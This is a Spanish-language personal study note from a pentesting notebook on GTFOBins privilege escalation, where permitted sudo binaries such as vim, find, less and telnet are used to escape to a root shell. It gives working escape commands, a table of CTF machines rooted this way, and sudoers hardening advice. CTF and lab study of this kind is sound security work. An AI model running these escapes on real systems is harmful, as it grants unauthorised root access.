---
tags: [tecnica, escalada-linux, gtfobins, sudo]
tipo: tecnica
categoria: escalada-linux
estado: practicado
maquinas: [Cold Fear, SuraxCorp, Securitron, THLCPPTV16]
---

# GTFOBins (sudo / binarios con escape)

## 1. Qué es

Catálogo de binarios legítimos que permiten ejecutar comandos o escapar a shell cuando se invocan con `sudo`, SUID o capabilities.

## 2. Cómo funciona

- Muchos binarios permiten `-exec`, pagers (`less`/`man`) con `!sh`, o cargar configuraciones propias.
- `sudo <binario>` hereda los privilegios → escape.

## 3. Cuándo sospecharla

- `sudo -l` con binarios no triviales: `vim`, `less`, `find`, `aws`, `telnet`, `ar`, `tar`, `nginx`, `apt`.

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
sudo -l
# ejemplos
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo less /etc/hosts   # luego: !sh
sudo telnet            # luego: !/bin/sh
```

## 5. Herramientas

- [[GTFOBins]] (https://gtfobins.github.io/).

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Cold Fear]] | `sudo aws help` → pager `less` → `!sh`; `sudo find -exec` | root |
| [[SuraxCorp]] | `sudo telnet` → escape | root |
| [[Securitron]] | `sudo ar` para leer crontab | root (vía PATH hijack) |
| [[THLCPPTV16]] | `sudo vim`, `sudo nginx` | root |

## 7. Falsos positivos / pruebas fallidas

- Un binario en `sudo -l` que **no** aparece en GTFOBins necesita análisis manual.
- No todos los pagers permiten `!sh` según configuración (`LESSSECURE`, etc.).

## 8. Prevención y mitigación

- Evitar conceder pagers/editores/clientes interactivos en `sudoers`.
- Preferir comandos específicos y de solo lectura; mínimo privilegio.

## 9. Técnicas relacionadas

- [[SUID]], [[Sudo-Find-Exec]], [[Sudo-Vim]], [[Sudo-Telnet]], [[Sudo-Ar]], [[Sudo-Nginx]]
